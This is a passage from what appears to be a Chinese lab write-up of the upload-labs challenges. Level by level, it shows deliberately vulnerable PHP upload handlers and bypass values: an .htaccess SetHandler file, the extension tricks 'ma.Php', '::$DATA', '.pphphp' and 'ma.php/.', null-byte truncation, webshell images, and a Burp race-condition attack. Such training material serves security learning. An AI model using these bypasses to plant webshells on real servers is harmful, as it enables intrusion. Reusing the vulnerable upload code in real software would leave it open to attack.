alt="image-20210215124326909"></p><p>果然。</p><p><strong>绕过</strong></p><p>这个黑名单限制不是很全，找一个没有在限制里面的后缀就可以绕过，比如php3，但是当上传的这些文件要被当作php来执行，需要有以下条件：即Apache的httpd.conf有如下配置代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .ph3</span><br><span class="line">#配置里面有你所上传的后缀</span><br></pre></td></tr></table></figure><p>此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。</p><p>或者传个图片马</p><h3 id="Pass-04-htaccsess-1"><a href="#Pass-04-htaccsess-1" class="headerlink" title="Pass-04:.htaccsess"></a>Pass-04:.htaccsess</h3><p>找个马子试一下</p><p><img src="image-20210215125826838.png" alt="image-20210215125826838"></p><p>看了下后台，比较长，不好列举，就以提示给的tips列举</p><p><img src="image-20210215125736761.png" alt="image-20210215125736761"></p><p><strong>绕过</strong></p><p>可以看到没有限制.htaccsess文件，故可以上传.htaccsess文件绕过。内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这样所有文件都会解析为php，然后再上传图片马，就可以解析为php</p><h3 id="Pass-05：后缀大小写-1"><a href="#Pass-05：后缀大小写-1" class="headerlink" title="Pass-05：后缀大小写"></a>Pass-05：后缀大小写</h3><p>查看后台，这回完犊子了，加了.htaccess</p><p><img src="image-20210215133655371.png" alt="image-20210215133655371"></p><p>仔细看后台源代码，并没有转换大小写</p><p><img src="image-20210215134635811.png" alt="image-20210215134635811"></p><p><strong>绕过</strong></p><p>更改马子的后缀大小写，例如：<code>ma.Php</code></p><h3 id="Pass-06-空格绕过-1"><a href="#Pass-06-空格绕过-1" class="headerlink" title="Pass-06:空格绕过"></a>Pass-06:空格绕过</h3><p>仔细看后台源码</p><p><img src="image-20210215135013175.png" alt="image-20210215135013175"></p><p>相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个空格</p><h3 id="Pass-07：点绕过-1"><a href="#Pass-07：点绕过-1" class="headerlink" title="Pass-07：点绕过"></a>Pass-07：点绕过</h3><p>仔细看后台</p><p><img src="image-20210215140041505.png" alt="image-20210215140041505"></p><p>可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个“.”</p><h3 id="Pass-08-：-DATE-1"><a href="#Pass-08-：-DATE-1" class="headerlink" title="Pass-08 ：::$DATE"></a>Pass-08 ：::$DATE</h3><p>后台源码</p><p><img src="image-20210215140137448.png" alt="image-20210215140137448"></p><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p><blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p></blockquote><p>简单讲就是在php+windows的情况下：如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名.且保持<code>&quot;::$DATA&quot;</code>之前的文件名。</p><p><em>注:仅windows适用</em></p><p><strong>绕过</strong></p><p>用burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可</p><h3 id="Pass-09：点空格点-1"><a href="#Pass-09：点空格点-1" class="headerlink" title="Pass-09：点空格点"></a>Pass-09：点空格点</h3><p>后台</p><p><img src="image-20210215140532614.png" alt="image-20210215140532614"></p><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。</p><p><strong>绕过</strong></p><p>抓包构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code></p><h3 id="Pass-10：双写绕过-1"><a href="#Pass-10：双写绕过-1" class="headerlink" title="Pass-10：双写绕过"></a>Pass-10：双写绕过</h3><p>后台</p><p><img src="image-20210215141032311.png" alt="image-20210215141032311"></p><p>分析注意：<strong>str_ireplace</strong>函数<strong>不区分大小写</strong>的替换字符串中的一些字符，此次源码将黑名单里的文件后缀名替换成空字符。</p><p><strong>绕过</strong></p><p>用burp修改后缀名为 <code>.pphphp</code></p><h3 id="Pass-11：00截断-1"><a href="#Pass-11：00截断-1" class="headerlink" title="Pass-11：00截断"></a>Pass-11：00截断</h3><p>查看后台源码</p><p><img src="image-20210215141813823.png" alt="image-20210215141813823"></p><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用<code>GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。</p><p><strong>绕过</strong></p><p>00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p><blockquote><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p></blockquote><p>抓包进行修改</p><p><img src="image-20210215142538909.png" alt="image-20210215142538909"></p><p><img src="image-20210215142754495.png" alt="image-20210215142754495"></p><h3 id="Pass-12：-00-1"><a href="#Pass-12：-00-1" class="headerlink" title="Pass-12：%00"></a>Pass-12：%00</h3><p>后台源码</p><p><img src="image-20210215143512734.png" alt="image-20210215143512734"></p><p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</p><p><strong>绕过</strong></p><p><img src="image-20210215145042313.png" alt="image-20210215145042313"></p><p><img src="image-20210215145151607.png" alt="image-20210215145151607"></p><h3 id="Pass-13：文件头检测-1"><a href="#Pass-13：文件头检测-1" class="headerlink" title="Pass-13：文件头检测"></a>Pass-13：文件头检测</h3><p>这一关开始上传图片马，后台</p><p><img src="image-20210215161722242.png" alt="image-20210215161722242"></p><p>使用了 getReailFileType函数</p><p><strong>绕过</strong></p><p>burp抓包添加一个图片文件的文件幻数</p><p><img src="image-20210215161612151.png" alt="image-20210215161612151"></p><p>或者直接上传一张图片马即可。</p><h3 id="Pass-14：getimagesize-1"><a href="#Pass-14：getimagesize-1" class="headerlink" title="Pass-14：getimagesize"></a>Pass-14：getimagesize</h3><p>查看后台源码</p><p><img src="image-20210215151630875.png" alt="image-20210215151630875"></p><p>使用了getimagesize函数来验证，加对应图片的文件头就o了</p><p>比如：gif-GIF89a</p><p><img src="image-20210215153117383.png" alt="image-20210215153117383"></p><p>或者传一个图片马子</p><h3 id="Pass-15：exif-imagetype-1"><a href="#Pass-15：exif-imagetype-1" class="headerlink" title="Pass-15：exif_imagetype()"></a>Pass-15：exif_imagetype()</h3><p>后台</p><p><img src="image-20210215153456115.png" alt="image-20210215153456115"></p><p><strong>绕过</strong></p><p>同13、14一样</p><h3 id="Pass-16：二次渲染-1"><a href="#Pass-16：二次渲染-1" class="headerlink" title="Pass-16：二次渲染"></a>Pass-16：二次渲染</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。</p><p>这里就不再对比上传图片马前后的区别，直接结论：图片马的恶意内容被磨除了。</p><p><strong>绕过</strong></p><p>如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考我的上一篇文章中有总结：“文件上传”</p><h3 id="Pass-17：条件竞争时间差-1"><a href="#Pass-17：条件竞争时间差-1" class="headerlink" title="Pass-17：条件竞争时间差"></a>Pass-17：条件竞争时间差</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p><strong>绕过</strong></p><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p><p><img src="image-20210215163251176.png" alt="image-20210215163251176"></p><p>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="image-20210215164100568.png" alt="image-20210215164100568"></p><p>3、接下来设置访问请求<br>1、浏览器构造请求url：<code>http://127.0.0.1/upload-labs/upload/ma.Php</code>,进行访问，然后用burp抓包<br>2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</p><p>3、设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p><p>注意：条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p><p>另外一种方法，在上一篇文章中也讲过</p><p>也可以上传图片马</p><h3 id="Pass-18：突破上传重命名-1"><a href="#Pass-18：突破上传重命名-1" class="headerlink" title="Pass-18：突破上传重命名"></a>Pass-18：突破上传重命名</h3><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。</p><h3 id="Pass-19：-绕过-1"><a href="#Pass-19：-绕过-1" class="headerlink" title="Pass-19：.&#x2F;绕过"></a>Pass-19：.&#x2F;绕过</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name&#x3D;ma.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的&#x2F;.所以可以构造save_path&#x3D;ma.php&#x2F;.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的&#x2F;.可以实现保存文件为.php</p><p><strong>绕过</strong></p><p>burp抓包末尾添加：<code>save_name=ma.php/.</code>，注意马的名字与filename一致</p><p><img src="image-20210215173229186.png" alt="image-20210215173229186"></p><p>当然也可以传个图片马子</p><p>也可以直接在上传处保存文件名哪里后面加<code>/</code>或者<code>.</code>都可</p><h3 id="Pass-20：数组-绕过-1"><a href="#Pass-20：数组-绕过-1" class="headerlink" title="Pass-20：数组&#x2F;.绕过"></a>Pass-20：数组&#x2F;.绕过</h3><p>后台代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span 